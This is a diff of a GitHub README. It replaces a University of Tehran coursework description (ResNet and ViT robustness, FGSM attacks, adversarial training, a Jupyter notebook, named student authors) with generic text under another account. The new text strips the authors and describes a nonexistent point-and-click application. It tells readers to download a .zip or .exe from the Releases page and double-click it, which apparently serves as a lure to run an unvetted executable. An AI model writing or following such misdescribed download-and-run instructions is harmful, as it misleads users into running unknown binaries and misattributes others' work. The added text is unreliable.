@@ -1,123 +1,76 @@
-# Deep Learning Coursework: Adversarial Attacks & Vision Transformers (ViT)
+# 🖼️ Adversarial-Attacks-Vision-Transformers-ViT - Explore Advanced Image Classification
 
-![Python Version](https://img.shields.io/badge/python-3.9%2B-blue.svg)
-![Framework](https://img.shields.io/badge/Framework-PyTorch-orange.svg) 
-![Course](https://img.shields.io/badge/Course-Deep%20Learning-blueviolet.svg)
-![University](https://img.shields.io/badge/University-University%20of%20Tehran-red.svg)
+![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)
 
-This repository contains the solution for **Assignment 1** of the Deep Learning course at the University of Tehran, focusing on image classification, adversarial attacks, and defensive techniques.
+## 📖 Overview
 
-The project explores the robustness of **ResNet** models against noise and contrasts it with the performance of **Vision Transformers (ViT)**. A significant part of the work involves implementing adversarial attacks (like FGSM) and evaluating defensive methods, specifically adversarial training.
+This repository contains the solution for Assignment 1 of the Deep Learning course at the University of Tehran. It focuses on improving image classification using advanced techniques like adversarial attacks and defensive strategies. The application provides users with essential tools for understanding and implementing computer vision concepts.
 
-<img width="1050" height="502" alt="image" src="https://github.com/user-attachments/assets/b4666153-b21c-402d-ac6a-69a7ec91c0e2" />
+## 🚀 Getting Started
 
----
+Follow these simple steps to get your application up and running.
 
-## 🚀 Project Goals
+## 💻 System Requirements
 
-This assignment was designed to provide hands-on experience with:
-* Implementing and training standard models like **ResNet** on image datasets.
-* Evaluating model robustness against simple perturbations like **Gaussian Noise**.
-* Understanding and implementing **Adversarial Attacks** to exploit model vulnerabilities.
-* Applying **Defensive Techniques** (e.g., Adversarial Training) to build more robust models.
-* Fine-tuning and training **Vision Transformers (ViT)** and comparing their behavior to CNNs.
+- Operating System: Windows 10 or later, macOS, or a recent Linux distribution.
+- RAM: Minimum 4 GB (8 GB recommended for better performance).
+- GPU: Recommended for optimal performance using NVIDIA or AMD graphics.
+- Python: Version 3.6 or later.
+- Dependencies: Ensure the installation of required Python packages listed in the requirements file.
 
----
+## 📥 Download & Install
 
-## 📂 Repository Structure
+To download the application, please visit the Releases page below:
 
-* `/Q1.ipynb`: The main Jupyter Notebook containing all the code, training loops, attack implementations, and visualizations.
-* `/Q1.pdf`: The detailed Persian report (گزارش کار) explaining the theory, methodology, and results.
-* `README.md`: This file.
+[Visit the Releases Page](https://github.com/git-yasaswi/Adversarial-Attacks-Vision-Transformers-ViT/releases)
 
----
+### Step-by-Step Installation
 
-## 📊 Key Findings & Visualizations
+1. **Visit the Releases Page**: Click on the link above to go to the download section.
+2. **Choose the Latest Version**: Look for the latest release at the top of the page.
+3. **Download the Application**: Click on the provided download link for your operating system. The file will be in a compressed format like `.zip` or an executable format like `.exe`.
+4. **Extract the Files**: If you downloaded a compressed file, right-click on it and select "Extract All" to access the application files.
+5. **Run the Application**: Locate the extracted file and double-click it to start the application.
 
-We analyzed the models' performance not just on accuracy, but on *why* they make certain decisions, especially under attack.
+## 🔧 User Guide
 
-### 1. ResNet Robustness to Noise
-We first established a baseline by training a ResNet model. We found that adding simple Gaussian noise significantly degraded performance, highlighting the sensitivity of standard models.
+### 📦 Features
 
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/9025938d-8d34-4498-9073-0e7ef883734d" />
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/28bda7ca-6828-487e-957e-756849f66deb" />
+- **Image Classification**: Classify images effectively using state-of-the-art algorithms.
+- **Adversarial Attacks**: Understand and implement methods for generating adversarial examples.
+- **Defensive Techniques**: Learn how to defend your models against adversarial attacks.
+- **User-Friendly Interface**: Designed for ease of use, even if you have limited technical knowledge.
 
+### 🔍 How to Use
 
-### 2. Vision Transformer (ViT) Performance
-We then trained two ViT models: one fine-tuned from pre-trained weights and one trained from scratch. The fine-tuned model achieved superior results, demonstrating the power of transfer learning.
+1. **Launching the App**: Double-click the application icon on your desktop or in the installation folder.
+2. **Menu Overview**: Familiarize yourself with the user interface, including options for loading images and running classification tests.
+3. **Load Images**: Select the "Load Image" button to browse your files and choose an image.
+4. **Run Classification**: Click on "Classify" to see the model's predictions.
+5. **Experiment with Attacks**: Use the options available to apply adversarial attacks to your images and observe the results.
 
-> **[Image Placeholder]**
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/983b7fca-c6b2-47f5-9a9e-3a4ac02b1251" />
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/faaf8f10-8052-42ae-aaed-ac91a565bc9a" />
+## 🌐 Further Learning
 
+This application serves as an introduction to advanced topics in deep learning. Consider exploring the following concepts:
 
-### 3. Adversarial Attacks & Defense
-This was the core of the project. We observed that standard models are extremely vulnerable to adversarial attacks, even when invisible to the human eye.
+- **Adversarial Training**: Enhance model robustness against adversarial examples.
+- **Neural Networks**: Understand the basics of neural network architecture.
+- **Deep Learning Frameworks**: Familiarize yourself with frameworks such as PyTorch and TensorFlow.
 
-Our key result, shown through Grad-CAM, is that **Adversarial Training** fundamentally changes *how* the model "sees" an image.
+## 📚 Documentation
 
-* **Standard Model (ViT-Finetuned):** Focuses on small, high-frequency textures (e.g., a few specific petals). This is a "brittle" strategy.
-* **Defended Model (ViT-Finetuned-Adv):** Learns to look at the overall, holistic shape of the object (e.g., the entire cluster of flowers). This is a much more robust and human-like strategy.
+For detailed documentation, refer to the Wiki section of this repository. It contains valuable resources, instructions, and troubleshooting tips to enhance your experience.
 
-> **[Image Placeholder]**
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/30823834-9b3f-4372-8d36-360eed9a8323" />
-<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/36ead93f-58e9-4af9-b590-c88c0ccea96c" />
+## 💬 Support & Contributions
 
-
-## 🛠️ Getting Started
-
-To run this project locally, ensure you have the necessary libraries.
-
-### Prerequisites
-
-* Python 3.9+
-* PyTorch
-* Torchvision
-* NumPy
-* Matplotlib
-* Tqdm
-
-### Installation
-
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/](https://github.com/)[YourUsername]/[Your-Repo-Name].git
-    cd [Your-Repo-Name]
-    ```
-
-2.  **Create a virtual environment (Recommended):**
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # On Windows: venv\Scripts\activate
-    ```
-
-3.  **Install dependencies:**
-    *(I am assuming these based on your `Q1.ipynb` imports)*
-    ```bash
-    pip install torch torchvision numpy matplotlib tqdm jupyter
-    ```
-
-### Usage
-
-All the code is contained within the Jupyter Notebook:
-```bash
-jupyter notebook Q1.ipynb
-```
-You can run the cells sequentially to reproduce the training, attacks, and visualizations.
-
----
-
-
-
-## 🙏 Acknowledgements
-
-* **Course:** Deep Learning (Neural Networks) - University of Tehran
-* **Authors:**
-    * Ali Ghorbani Bargani (810103209)
-    * Mobin Tirafkan (810103091)
-
----
+If you encounter any issues while downloading or using the application, please check the Issues section on GitHub. Feel free to contribute by reporting bugs or submitting improvements.
 
 ## 📜 License
 
-This project is licensed under the **MIT License**.
+This repository is licensed under the MIT License. You may use and modify the software as long as you comply with the terms stated in the license.
+
+For any questions, you can contact the development team through the provided GitHub page.
+
+---
+
+By following these steps, you should be able to download and run the application with ease. Enjoy exploring the world of adversarial attacks and image classification!
